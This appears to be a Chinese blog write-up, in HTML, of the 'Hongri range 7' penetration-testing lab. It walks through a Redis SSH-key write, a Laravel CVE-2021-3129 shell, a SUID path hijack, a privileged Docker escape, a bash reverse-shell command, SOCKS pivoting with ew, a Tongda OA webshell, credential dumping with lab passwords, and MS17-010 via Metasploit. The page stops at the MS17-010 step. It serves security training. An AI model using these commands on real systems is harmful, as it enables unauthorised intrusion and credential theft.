@@ -1,0 +1,410 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>红日靶场7 | ming</title><meta name="author" content="ming"><meta name="copyright" content="ming"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="红日靶场7流程goby扫描192.168.1.0&#x2F;24网段，探测出192.168.1.4存在Laravel框架RCE以及Redis未授权漏洞，利用redis未授权获取了192.168.1.4(linux)的shell，信息收集发现192.168.1.4只是将192.168.52.20(linux)的web服务代理出来，通过CVE-2021-3129获取了192.168.52.20的web服务权限，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场7">
+<meta property="og:url" content="http://blog.ming9.top/2023/11/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html">
+<meta property="og:site_name" content="ming">
+<meta property="og:description" content="红日靶场7流程goby扫描192.168.1.0&#x2F;24网段，探测出192.168.1.4存在Laravel框架RCE以及Redis未授权漏洞，利用redis未授权获取了192.168.1.4(linux)的shell，信息收集发现192.168.1.4只是将192.168.52.20(linux)的web服务代理出来，通过CVE-2021-3129获取了192.168.52.20的web服务权限，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.ming9.top/img/red.jpg">
+<meta property="article:published_time" content="2023-11-23T10:02:13.000Z">
+<meta property="article:modified_time" content="2023-11-26T01:23:16.275Z">
+<meta property="article:author" content="ming">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.ming9.top/img/red.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="http://blog.ming9.top/2023/11/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":800},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '红日靶场7',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-11-26 09:23:16'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"  media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/Casual/"><i class="fa-fw fa fa-pencil"></i><span> 随笔</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/red.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="ming"><span class="site-name">ming</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/Casual/"><i class="fa-fw fa fa-pencil"></i><span> 随笔</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">红日靶场7</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-23T10:02:13.000Z" title="发表于 2023-11-23 18:02:13">2023-11-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-26T01:23:16.275Z" title="更新于 2023-11-26 09:23:16">2023-11-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="红日靶场7"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="红日靶场7"><a href="#红日靶场7" class="headerlink" title="红日靶场7"></a>红日靶场7</h1><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">goby扫描192.168.1.0/24网段，探测出192.168.1.4存在Laravel框架RCE以及Redis未授权漏洞，利用redis未授权获取了192.168.1.4(linux)的shell，信息收集发现192.168.1.4只是将192.168.52.20(linux)的web服务代理出来，通过CVE-2021-3129获取了192.168.52.20的web服务权限，发现这是由docker搭建的web服务，通过docker提权、逃逸获取了192.168.52.20的root权限，进行信息收集探测到192.168.93.0/24网段，使用了fscan发现192.168.93.0/24网段的3台机器都有ms-17010漏洞，192.168.93.20(windows)存在通达OA服务，利用通达OA漏洞获取了192.168.93.20的shell以及192.168.93.20(域控)和192.168.93.20的账户以及密码，利用ms17-010以及psexec获取了域控的shell</span><br></pre></td></tr></table></figure>
+
+<h2 id="192-168-1-4"><a href="#192-168-1-4" class="headerlink" title="192.168.1.4"></a>192.168.1.4</h2><h3 id="goby扫描"><a href="#goby扫描" class="headerlink" title="goby扫描"></a>goby扫描</h3><p>192.168.1.4 发现 php Laravel框架RCE 以及 Redis未授权</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231024103524912.png" alt="image-20231024103524912"></p>
+<h3 id="redis写ssh公钥并进行ssh连接"><a href="#redis写ssh公钥并进行ssh连接" class="headerlink" title="redis写ssh公钥并进行ssh连接"></a>redis写ssh公钥并进行ssh连接</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen                                                            生成 SSH 密钥对</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; 1.txt                将id_rsa.pub写入到1.txt中</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 1.txt | redis-cli -h 192.168.1.4 -x set crack                     命名crack键值</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.1.4                                              连接redis</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /root/.ssh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONFIG SET dbfilename authorized_keys                                 在/root/.ssh/authorized_keys文件中存放crack的值</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">quit</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.1.4                                        ssh登录</span><br></pre></td></tr></table></figure>
+
+<h3 id="将192-168-1-4连上Cs控"><a href="#将192-168-1-4连上Cs控" class="headerlink" title="将192.168.1.4连上Cs控"></a>将192.168.1.4连上Cs控</h3><p>下方插件可以将linux机器加入到Cs控中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/gloxec/CrossC2/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231024105224013.png" alt="image-20231024105224013"></p>
+<p>生成木马t_cc2.out</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123095335954.png" alt="image-20231123095335954"></p>
+<p>使用以下命令将t_cc2.out传到192.168.1.4的root目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -r ./t_cc2.out root@192.168.1.4:/root</span><br></pre></td></tr></table></figure>
+
+<p>192.168.1.4运行t_cc2.out就上线了</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231024112636553.png" alt="image-20231024112636553"></p>
+<h3 id="收集192-168-1-4的内网信息"><a href="#收集192-168-1-4的内网信息" class="headerlink" title="收集192.168.1.4的内网信息"></a>收集192.168.1.4的内网信息</h3><p>双网卡机器，存在192.168.52.0&#x2F;24网段</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231024112753357.png" alt="image-20231024112753357"></p>
+<p>发现web服务代理于192.168.52.20:8000</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231025170103404.png" alt="image-20231025170103404"></p>
+<h2 id="192-168-52-20"><a href="#192-168-52-20" class="headerlink" title="192.168.52.20"></a>192.168.52.20</h2><h3 id="CVE-2021-3129得shell"><a href="#CVE-2021-3129得shell" class="headerlink" title="CVE-2021-3129得shell"></a>CVE-2021-3129得shell</h3><p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107100255454.png" alt="image-20231107100255454"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -la /.dockerenv                                                查看存在不存在.</span><br></pre></td></tr></table></figure>
+
+<p>发现是docker环境</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107180939293.png" alt="image-20231107180939293"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null                            在根目录下查找   执行文件时暂时拥有文件所有者权限的文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107101547608.png" alt="image-20231107101547608"></p>
+<p>&#x2F;home&#x2F;jobs&#x2F;shell是一个用户自己编写的可执行文件</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107101835969.png" alt="image-20231107101835969"></p>
+<p>发现这个程序会运行system(‘ps’)</p>
+<p>修改环境变量，使shell文件在执行ps程序的时候优先执行&#x2F;var&#x2F;www&#x2F;html下的ps程序(&#x2F;bin&#x2F;bash)</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107102242406.png" alt="image-20231107102242406"></p>
+<p>Bug:哥斯拉下的shell不能修改环境变量，还是需要将shell反弹到192.168.1.4上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 9102                                                        192.168.1.4监听9102端口</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.52.1/9102 0&gt;&amp;1&#x27;                命令执行反弹shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123100726791.png" alt="image-20231123100726791"></p>
+<p>修改环境变量，获取root权限</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123101159940.png" alt="image-20231123101159940"></p>
+<h3 id="docker逃逸成root权限"><a href="#docker逃逸成root权限" class="headerlink" title="docker逃逸成root权限"></a>docker逃逸成root权限</h3><p><code>--privileged</code> 是 Docker 的一个安全特权设置，允许容器在主机上执行一些敏感的系统级任务。启用 <code>--privileged</code> 选项的 Docker 容器将拥有对主机系统内核的完全访问权限</p>
+<p>而该docker容器就是 依靠 特权模式 运行的</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107185327046.png" alt="image-20231107185327046"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir ming                                                     创建个ming文件夹</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount /dev/sda1 ming                                           将这个文件夹挂载到sda1</span><br></pre></td></tr></table></figure>
+
+<p>192.168.1.4这台web机器创建的ssh公钥传递给他使用</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107193601350.png" alt="image-20231107193601350"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 2048</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat id_rsa.pub</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDsSSs+mpDoog9i/eAOHdffSvwzDi1GRpWfdi5jGF/8j1IcAlg7NsE7XJOWMyEuKD5H4wu56TuHUorTDyV3RNZpNKw5a9eUfFaxBPTXvbCLixLroWrYZO+F9y9XWsogCROebtkdvg9irzg/nwJEHkxmwmqBKc9ek6kVfqD63klkSYv0fPVMPqew32jUELUstYqjCQhQikgwngJ5mkLMs04tdjh+im3/GXLkRMNM3efItj9JXgNycGFfmuLf2QrkZHqNeVmg/CvBFiK7Alc+0LbA+WMEPaSxjADXDOxFPEKkVqysfb6cViCGGjDaseAAyLuES3ls+WL8pFbC7CLdS9Z root@ubuntu</span><br></pre></td></tr></table></figure>
+
+<p>在docker特权模式下将这个文件用echo命令将公钥写入到&#x2F;var&#x2F;www&#x2F;html&#x2F;ming&#x2F;root&#x2F;.ssh&#x2F;authorized_keys 下，</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107211037430.png" alt="image-20231107211037430"></p>
+<p>ssh <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#x35;&#x32;&#46;&#50;&#48;">&#114;&#x6f;&#x6f;&#x74;&#x40;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#x35;&#x32;&#46;&#50;&#48;</a> 直接登录</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107211155018.png" alt="image-20231107211155018"></p>
+<h3 id="收集192-168-52-20的内网信息"><a href="#收集192-168-52-20的内网信息" class="headerlink" title="收集192.168.52.20的内网信息"></a>收集192.168.52.20的内网信息</h3><p>存在192.168.93.0网段</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107211320572.png" alt="image-20231107211320572"></p>
+<h3 id="将192-168-52-20连上Cs控"><a href="#将192-168-52-20连上Cs控" class="headerlink" title="将192.168.52.20连上Cs控"></a>将192.168.52.20连上Cs控</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/gloxec/CrossC2/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107212926064.png" alt="image-20231107212926064"></p>
+<p>上传到192.168.1.4</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107213455027.png" alt="image-20231107213455027"></p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107214101074.png" alt="image-20231107214101074"></p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107214227615.png" alt="image-20231107214227615"></p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107214235146.png" alt="image-20231107214235146"></p>
+<h3 id="收集网段信息"><a href="#收集网段信息" class="headerlink" title="收集网段信息"></a>收集网段信息</h3><p>存在192.168.93.0&#x2F;24网段</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123112247168.png" alt="image-20231123112247168"></p>
+<h3 id="fscan一把嗦"><a href="#fscan一把嗦" class="headerlink" title="fscan一把嗦"></a>fscan一把嗦</h3><p>192.168.93.30是域控，20，30，40都存在ms17010漏洞，192.168.93.20有通达OA系统</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231107215350797.png" alt="image-20231107215350797"></p>
+<h3 id="ew代理"><a href="#ew代理" class="headerlink" title="ew代理"></a>ew代理</h3><p>为了连通93.0&#x2F;24网段需要搭路由</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/idlefire/ew</span><br></pre></td></tr></table></figure>
+
+<p>将192.168.1.4的1080端口接收的流量传递到192.168.52.20的9999端口</p>
+<p>192.168.1.4执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s lcx_tran -l 1080 -f 192.168.52.20 -g 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231108114026255.png" alt="image-20231108114026255"></p>
+<p>192.168.52.20执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231108114119149.png" alt="image-20231108114119149"></p>
+<p>wsl kali修改代理</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231108114315091.png" alt="image-20231108114315091"></p>
+<p>proxychains firefox打开浏览器访问192.168.93.20，进入二层内网</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231108114516948.png" alt="image-20231108114516948"></p>
+<h2 id="192-168-93-20"><a href="#192-168-93-20" class="headerlink" title="192.168.93.20"></a>192.168.93.20</h2><h3 id="通达OA文件上传"><a href="#通达OA文件上传" class="headerlink" title="通达OA文件上传"></a>通达OA文件上传</h3><p>探测OA漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/xiaokp7/TongdaOATool</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231108120136327.png" alt="image-20231108120136327"></p>
+<p>上传shell</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231108120324915.png" alt="image-20231108120324915"></p>
+<p>修改蚁剑的代理</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231108120545551.png" alt="image-20231108120545551"></p>
+<p>编辑连接数据</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231108120608937.png" alt="image-20231108120608937"></p>
+<p>whoami体现system权限</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231108120651936.png" alt="image-20231108120651936"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>上传猕猴桃以及nc</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231108143306182.png" alt="image-20231108143306182"></p>
+<p>192.168.52.20这台机器nc连接192.168.93.20</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231108143522583.png" alt="image-20231108143522583"></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123152622114.png" alt="image-20231123152622114"></p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123152714420.png" alt="image-20231123152714420"></p>
+<h3 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h3><p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123152815721.png" alt="image-20231123152815721"></p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123152856117.png" alt="image-20231123152856117"></p>
+<p>​       域名字      WHOAMIANONY</p>
+<p>​       域控          username:administrator   password:Whoami2021</p>
+<p>​       域内用户  username:bunny                 password:Bunny2021</p>
+<h3 id="开启远程连接登录"><a href="#开启远程连接登录" class="headerlink" title="开启远程连接登录"></a>开启远程连接登录</h3><p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123153249500.png" alt="image-20231123153249500"></p>
+<p>开启了远程连接，但是不能使用域内用户去登录，存在域控限制，所以如果要远程连接，就需要创建个用户，再进行登录</p>
+<h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123155819327.png" alt="image-20231123155819327"></p>
+<h3 id="mstsc"><a href="#mstsc" class="headerlink" title="mstsc"></a>mstsc</h3><p>proxifer设置</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123153350358.png" alt="image-20231123153350358"></p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123153428703.png" alt="image-20231123153428703"></p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123161320583.png" alt="image-20231123161320583"></p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123161352868.png" alt="image-20231123161352868"></p>
+<h2 id="192-168-93-30"><a href="#192-168-93-30" class="headerlink" title="192.168.93.30"></a>192.168.93.30</h2><h3 id="ew代理-1"><a href="#ew代理-1" class="headerlink" title="ew代理"></a>ew代理</h3><p>192.168.1.4</p>
+<p>搭建流量中转，将192.168.1.6端口1080的流量通向192.168.52.20的9999端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s lcx_slave -d 192.168.1.6 -e 1080 -f 192.168.52.20 -g 9999</span><br></pre></td></tr></table></figure>
+
+<p>192.168.52.20</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>
+
+<p>192.168.1.6(kali)</p>
+<p>监听12345端口，将12345端口接收的流量从1080端口转出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ew_for_linux64 -s lcx_listen -l 12345 -e 1080</span><br></pre></td></tr></table></figure>
+
+<p>修改&#x2F;etc&#x2F;proxychains.conf文件</p>
+<p><img src="/images/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA7/image-20231123115754754.png" alt="image-20231123115754754"></p>
+<h3 id="msf利用17010进行命令执行"><a href="#msf利用17010进行命令执行" class="headerlink" title="msf利用17010进行命令执行"></a>msf利用17010进行命令执行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains msfconsole</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br></pre></td></tr></table></figure>
+
